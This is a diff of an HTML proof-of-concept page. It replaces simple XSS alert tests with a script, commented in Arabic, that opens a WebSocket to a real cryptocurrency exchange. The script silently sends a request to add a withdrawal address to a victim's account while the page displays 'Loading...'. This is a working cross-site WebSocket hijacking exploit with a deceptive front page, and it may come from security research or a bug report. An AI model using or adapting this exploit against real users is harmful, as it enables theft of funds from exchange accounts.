@@ -1,8 +1,27 @@
 <!DOCTYPE html>
 <html>
-  <head><title>XSS PoC</title></head>
   <body>
-    <script>alert("Redirected with XSS!")</script>
-    <script>alert(document.cookie)</script>
+    <script>
+      // فتح WebSocket connection مع السيرفر
+      const ws = new WebSocket("wss://ws.nonkyc.io");
+
+      ws.onopen = function () {
+        // إرسال الرسالة اللي هتضيف عنوان سحب جديد في حساب الضحية
+        const payload = `424["get",{
+          "method":"get",
+          "headers":{},
+          "data":{
+            "newname":"hhh",
+            "newaddr":"hhh",
+            "newpayid":"",
+            "assetid":"6802a74c2383b84ade59f51d"
+          },
+          "url":"/api/v1/account/do-withdrawaddress"
+        }]`;
+
+        ws.send(payload);
+      };
+    </script>
+    <h1>Loading...</h1>
   </body>
 </html>
